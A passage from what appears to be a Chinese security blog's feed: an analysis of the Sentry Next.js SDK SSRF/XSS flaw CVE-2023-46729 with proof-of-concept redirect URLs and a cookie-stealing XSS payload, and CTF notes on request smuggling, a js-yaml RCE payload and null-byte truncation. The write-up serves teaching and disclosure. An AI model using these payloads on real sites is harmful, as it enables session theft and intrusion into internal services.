component，決定哪些需要狀態哪些不需要，不需要的就直接在 server render 完再送來 client，需要的就維持以前的作法。</p><p>這種方式確實會再讓網頁往上加速，但同時開發也變得越來越複雜，有更多東西需要考慮，debug 也更不方便了一些，一些心得跟細節我之後再寫篇文章分享吧。</p><h2><span id="總結">總結</span></h2><p>我自己真正接觸各種前端工具的時間其實比較晚一點，撇除最開始寫 FrontPage 或是 Dreamweaver 那種不談，大概 2012 年左右開始寫 jQuery，接著就是觀望各種前端的發展但都沒有碰過，有曾經想學過 AngularJS（那時候真的很夯）還有 Ember.js，但就是懶。</p><p>是一直到 2015 年才開始在工作上接觸到 React，那時候是 React 剛在台灣要流行起來的時候。</p><p>所以早期 Backbone.js 那個年代的東西我沒有參與到，在寫這篇文章的時候找了不少資料，其實還滿有趣的，算是幫自己補足了沒有參與到的那一段歷史。</p><p>在查資料的時候，也發現 Yahoo! 真的是網頁前端的先行者，例如說 <a href="https://blog.huli.tw/2022/05/23/atomic-css-and-tailwind-css/">Atomic CSS</a> 就是 Yahoo! 開始的，而這次也發現 2012 年時 Yahoo! 就已經在使用 Universal JavaScript 的網頁框架了。</p><p>如果你對 SSR 有不同的見解，或是覺得我對歷史發展脈絡的詮釋有點誤會，可以直接寫一篇新的文章與我交流，畢竟有些概念不是三言兩語可以講清楚的，寫篇文章比較完整；或是也可以透過留言討論。</p><h2><span id="參考資料">參考資料</span></h2><ol><li><a href="https://zh.wikipedia.org/zh-tw/AJAX">AJAX</a></li><li><a href="https://www.sencha.com/blog/a-fond-farewell-to-yui/">A Fond Farewell to YUI</a></li><li><a href="https://zh.wikipedia.org/zh-tw/XMLHttpRequest">XMLHttpRequest</a></li><li><a href="https://en.wikipedia.org/wiki/Isomorphic_JavaScript">Isomorphic</a></li><li><a href="https://deno.com/blog/the-future-and-past-is-server-side-rendering">The Future (and the Past) of the Web is Server Side Rendering</a></li><li><a href="https://www.youtube.com/watch?v=k-A2VfuUROg&ab_channel=ChromeforDevelopers">Rendering on the Web: Performance Implications of Application Architecture (Google I&#x2F;O ’19)</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;你知道嗎，當你跟朋友在討論 SSR 的時候，很有可能你們對 SSR 的認知其實是不一樣的。直接舉個例子，底下這幾種情境，你覺得哪些算是 SSR？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;由後端 PHP 產生畫面&lt;/li&gt;
&lt;li&gt;前端是 React 寫成的 SPA，但後端如果偵測到搜尋引擎，就會切換另一種 template，輸出專門針對搜尋引擎的模板，而非 React 渲染出的頁面&lt;/li&gt;
&lt;li&gt;前端是 React 寫成的 SPA，但透過 Prerender 先把頁面 render 成 HTML，再交給搜尋引擎（一般使用者依然是 SPA），跟上一個的差別是使用者跟搜尋引擎看到的畫面基本上一致&lt;/li&gt;
&lt;li&gt;前端是 React 寫成的 SPA，在後端用 &lt;code&gt;renderToString&lt;/code&gt; 把 React 渲染成字串，但是沒有資料，資料會在前端拿&lt;/li&gt;
&lt;li&gt;前端是 React 寫成的 SPA，後端會針對每個 page 先呼叫 API 拿資料，拿完以後才呼叫 &lt;code&gt;renderToString&lt;/code&gt; 輸出 HTML，在 client 端時會做 hydration 讓頁面可以互動&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有一種人認為只要是由後端產生出畫面，就叫做 SSR，所以 1 ~ 5 全部都是 SSR。也有一種人認為前端必須先是 SPA，此時搭配的後端才能叫做 SSR，所以 2~5 都是 SSR；而另一種人則認為 SSR 的重點是 hydration，所以只有 5（或是 45）是 SSR。&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>簡單分析 CVE-2023-46729：Sentry Next.js SDK 的 URL rewrite 漏洞</title>
    <link href="https://blog.huli.tw/2023/11/13/sentry-nextjs-sdk-cve-2023-46729/"/>
    <id>https://blog.huli.tw/2023/11/13/sentry-nextjs-sdk-cve-2023-46729/</id>
    <published>2023-11-13T06:40:00.000Z</published>
    <updated>2023-11-13T13:17:12.163Z</updated>
    
    <content type="html"><![CDATA[<p>Sentry 在 2023 年 11 月 9 號時，在部落格上發布了這篇文章：<a href="https://blog.sentry.io/next-js-sdk-security-advisory-cve-2023-46729/">Next.js SDK Security Advisory - CVE-2023-46729</a>，內容主要在講述 CVE-2023-46729 這個漏洞的一些細節，包含漏洞成因、發現時間以及修補時間等等。</p><p>雖然說是在 11&#x2F;9 正式對外發布漏洞公告，但漏洞其實在 10&#x2F;31 發佈的 7.77.0 版本已經修復了，有預留一些時間給開發者們來修補漏洞。</p><p>接著就來簡單講一下這個漏洞的成因以及攻擊方式。</p><span id="more"></span><h2><span id="漏洞分析">漏洞分析</span></h2><p>在 GitHub 上面也有一個比較偏技術的說明：<a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-2rmr-xw8m-22q9">CVE-2023-46729: SSRF via Next.js SDK tunnel endpoint</a></p><p>可以看到這一段：</p><blockquote><p>An unsanitized input of Next.js SDK tunnel endpoint allows sending HTTP requests to arbitrary URLs and reflecting the response back to the user. </p></blockquote><p>在 Sentry 裡面，有一個叫做 tunnel 的功能，這張來自於<a href="https://docs.sentry.io/platforms/javascript/troubleshooting/#dealing-with-ad-blockers">官方文件</a>的圖完美地解釋了為什麼需要 tunnel：</p><p><img src="/img/sentry-nextjs-sdk-cve-2023-46729/p1.png" alt="tunnel"></p><p>如果沒有 tunnel 的話，送給 Sentry 的請求會在前端直接透過瀏覽器發送，而這些直接發給 Sentry 的請求可能會被一些 ad blocker 擋住，Sentry 就沒辦法接收到數據。若是有開啟 tunnel，就會變成先將請求發送給自己的 server，再從自己的 server 轉發給 Sentry，這樣就變成了 same-origin 的請求，便不會被 ad blocker 擋住。</p><p>在專門提供給 Next.js 使用的 Sentry SDK 中，是用了一個叫做 <a href="https://nextjs.org/docs/app/api-reference/next-config-js/rewrites">rewrite</a> 的功能，官方範例如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">async</span> <span class="token function">rewrites</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token string">'/blog'</span><span class="token punctuation">,</span>        <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://example.com/blog'</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#123;</span>        <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token string">'/blog/:slug'</span><span class="token punctuation">,</span>        <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://example.com/blog/:slug'</span><span class="token punctuation">,</span> <span class="token comment">// Matched parameters can be used in the destination</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Next.js 的 rewrite 基本上可以分為兩種，internal 跟 external，後者的話其實更像是 proxy 的感覺，可以直接把請求導向到外部網站，然後顯示出 response。</p><p>Next.js Sentry SDK 的實作在 <a href="https://github.com/getsentry/sentry-javascript/blob/7.69.0/packages/nextjs/src/config/withSentryConfig.ts#L98">sentry-javascript&#x2F;packages&#x2F;nextjs&#x2F;src&#x2F;config&#x2F;withSentryConfig.ts</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Injects rewrite rules into the Next.js config provided by the user to tunnel * requests from the `tunnelPath` to Sentry. * * See https://nextjs.org/docs/api-reference/next.config.js/rewrites. */</span><span class="token keyword">function</span> <span class="token function">setUpTunnelRewriteRules</span><span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">userNextConfig</span><span class="token operator">:</span> NextConfigObject<span class="token punctuation">,</span> <span class="token literal-property property">tunnelPath</span><span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> originalRewrites <span class="token operator">=</span> userNextConfig<span class="token punctuation">.</span>rewrites<span class="token punctuation">;</span>  <span class="token comment">// This function doesn't take any arguments at the time of writing but we future-proof</span>  <span class="token comment">// here in case Next.js ever decides to pass some</span>  userNextConfig<span class="token punctuation">.</span><span class="token function-variable function">rewrites</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args<span class="token operator">:</span> unknown<span class="token punctuation">[</span><span class="token punctuation">]</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> injectedRewrite <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]`</span>      <span class="token comment">// Nextjs will automatically convert `source` into a regex for us</span>      <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tunnelPath<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(/?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>      <span class="token literal-property property">has</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>          <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>.*)'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>          <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>          <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token comment">// short for projectId - we keep it short so matching is harder for ad-blockers</span>          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;projectid>.*)'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> originalRewrites <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it</span>    <span class="token keyword">const</span> originalRewritesResult <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">originalRewrites</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>originalRewritesResult<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">,</span> <span class="token operator">...</span>originalRewritesResult<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token operator">...</span>originalRewritesResult<span class="token punctuation">,</span>        <span class="token literal-property property">beforeFiles</span><span class="token operator">:</span> <span class="token punctuation">[</span>injectedRewrite<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">(</span>originalRewritesResult<span class="token punctuation">.</span>beforeFiles <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的重中之重就是這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> injectedRewrite <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]`</span>  <span class="token comment">// Nextjs will automatically convert `source` into a regex for us</span>  <span class="token literal-property property">source</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>tunnelPath<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(/?)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>  <span class="token literal-property property">has</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>      <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>.*)'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>      <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token comment">// short for projectId - we keep it short so matching is harder for ad-blockers</span>      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;projectid>.*)'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token literal-property property">destination</span><span class="token operator">:</span> <span class="token string">'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>會根據 query string 中的 <code>o</code> 跟 <code>p</code>，決定最後要重新導向的 URL。</p><p>而這邊的問題是這兩個參數的 regexp 都用了 <code>.*</code>，也就是說會配對到任何字元，換句話說，底下這個網址：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;abc&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>會 proxy 到：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;oabc.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看起來沒什麼問題，但如果是這樣呢？</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;example.com%23&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>%23</code> 是 <code>#</code> URL encode 後的結果，最後就會 proxy 到：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;oexample.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我們利用了 <code>#</code> 來把原本的 hostname 都當成 hash 的一部分，並且成功更改了 proxy 的目的地。但最前面那個 o 還是有點煩人，不如把它一起消除掉吧！只要在最前面加個 <code>@</code> 就行了：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;@example.com%23&amp;p&#x3D;def<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>會變成：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;o@example.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如此一來，攻擊者就可以利用 o 這個參數更改 proxy 的目的地，將 request 導向至任何地方。剛剛有說過這個 rewrite 功能會將 response 直接回傳，所以當使用者瀏覽：<code>https://huli.tw/tunnel?o=@example.com%23&amp;p=def</code> 的時候，看到的 response 會是 <code>example.com</code> 的結果。</p><p>也就是說，如果攻擊者把請求導向至自己的網站，就可以輸出 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，就變成了一個 XSS 漏洞。</p><p>若是攻擊者不是導到自己的網站，而是導向到其他內部的網頁如 <code>https://localhost:3001</code> 之類的，就是一個 SSRF 的漏洞（但目標必須支援 HTTPS 就是了）。</p><p>至於修復方式的話也很簡單，只要對 regexp 做出一些限制即可，最後 Sentry 是調整成<a href="https://github.com/getsentry/sentry-javascript/pull/9416/files">只允許數字</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'query'</span><span class="token punctuation">,</span>  <span class="token literal-property property">key</span><span class="token operator">:</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token comment">// short for orgId - we keep it short so matching is harder for ad-blockers</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'(?&lt;orgid>\\d*)'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7.77.0 版本以及之後的版本都已經修復了這個問題。</p><h2><span id="總結">總結</span></h2><p>這個漏洞真的滿簡單而且滿好重現的，只需要找到修復的 commit，看兩眼程式碼大概就能知道怎麼攻擊。</p><p>總之呢，在做 URL rewrite 的時候真的必須謹慎一點，不然還滿容易出問題的（尤其是你不只是 rewrite path，而是 rewrite 整個 URL）。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Sentry 在 2023 年 11 月 9 號時，在部落格上發布了這篇文章：&lt;a href=&quot;https://blog.sentry.io/next-js-sdk-security-advisory-cve-2023-46729/&quot;&gt;Next.js SDK Security Advisory - CVE-2023-46729&lt;/a&gt;，內容主要在講述 CVE-2023-46729 這個漏洞的一些細節，包含漏洞成因、發現時間以及修補時間等等。&lt;/p&gt;
&lt;p&gt;雖然說是在 11&amp;#x2F;9 正式對外發布漏洞公告，但漏洞其實在 10&amp;#x2F;31 發佈的 7.77.0 版本已經修復了，有預留一些時間給開發者們來修補漏洞。&lt;/p&gt;
&lt;p&gt;接著就來簡單講一下這個漏洞的成因以及攻擊方式。&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON CTF 2023 與 SECCON CTF 2023 筆記</title>
    <link href="https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/</id>
    <published>2023-09-23T07:40:00.000Z</published>
    <updated>2023-09-23T07:43:57.582Z</updated>
    
    <content type="html"><![CDATA[<p>這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。</p><p>關鍵字列表：</p><ol><li>nim json, null byte</li><li>nim request smuggling</li><li>js-yaml</li><li>web worker</li><li>blob URL</li><li>meta redirect</li><li>file protocol &amp; .localhost domain</li><li>sxg: Signed Exchanges</li><li>431 CSP bypass</li><li>DOM clobbering document.body</li><li>ejs delimiter</li><li>Node.js + Deno prototye pollution gadget</li><li>XSleaks golang sort</li></ol><span id="more"></span><h2><span id="hitcon-ctf-2023">HITCON CTF 2023</span></h2><p>最近好像很少看到每一題都低於 10 組解出來的 web 題了，上次有這種整場比賽幾乎都是 hard web 可能是 DiceCTF 吧？不過我覺得難度是其次，好玩有趣有學到新東西才是重點，而這些題目在我看來很顯然有做到這點。</p><p>先附上兩位作者的 writeup，底下提到作者 writeup 就不額外附連結了：</p><ol><li><a href="https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/">https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/</a></li><li><a href="https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023">https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023</a></li></ol><p>兩個作者的 writeup 都寫得很詳細，我這邊只是看完之後記錄一些重點而已。</p><h3><span id="login-system-7-solves">Login System (7 solves)</span></h3><p>這題有兩個 server，node.js 跟 nim，基本上大部分功能都是在 nim server 實現的，你可以登入、註冊以及修改密碼，而使用者的資料會存在 yaml 檔案裡面，目標是要達成 RCE。</p><p>第一個洞是 request smuggling，Node.js 接受 <code>Transfer-Encoding: CHUNKED</code> 但是 Nim 只看 <code>chunk</code>，可以利用這個差異來達成走私的目的。</p><p>但走私之後能幹嘛呢？</p><p>第二個洞是 Nim 對於 JSON 的行為，先把一個欄位設成很大的數字，Nim 會把它當作是一個 RawNumber，在更新的時候就會不帶引號，可以利用這點來達成 JSON injection。</p><p>第三個洞是有了 JSON injection 之後就可以利用 js-yaml 的功能創造出一個有 JS function 的物件，最後利用這個物件會在渲染時呼叫 toString，就達成 RCE 了。</p><p>大概會像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">privilegeLevel</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">toString</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>js<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">></span> <span class="token string">"function ()&#123;console.log('hi')&#125;"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">access</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'profile'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">register</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">login</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>喔對了，還有一個洞是 Nim 的檔案讀取，檔名的部分可以用 null byte 截斷：<code>test.yaml\u0000</code></p><h3><span id="canvas-4-solves">Canvas (4 solves)</span></h3><p>這題很有趣！</p><p>簡單來講就是把你的程式碼丟到 worker 裡面去執行，在 worker 裡面有做一些防護措施，讓你不能存取到 globalThis。就算在 worker 取得了 XSS，從 worker 唯一能做的事情就是往 main thread postMessage，但是結果會經過 <code>setHTML</code>，被瀏覽器的 Sanitizer API 給過濾掉。</p><p>worker 的 sandbox 滿有趣的，大概像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">allKeys</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>obj <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> fnCons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>    <span class="token parameter">f</span> <span class="token operator">=></span> f<span class="token punctuation">.</span>constructor  <span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> fnCons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token literal-property property">configurable</span><span class="token operator">:</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> cons <span class="token operator">=</span> <span class="token punctuation">[</span>Object<span class="token punctuation">,</span> Array<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Boolean<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> RegExp<span class="token punctuation">,</span> Promise<span class="token punctuation">,</span> Symbol<span class="token punctuation">,</span> BigInt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>fnCons<span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> cons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token 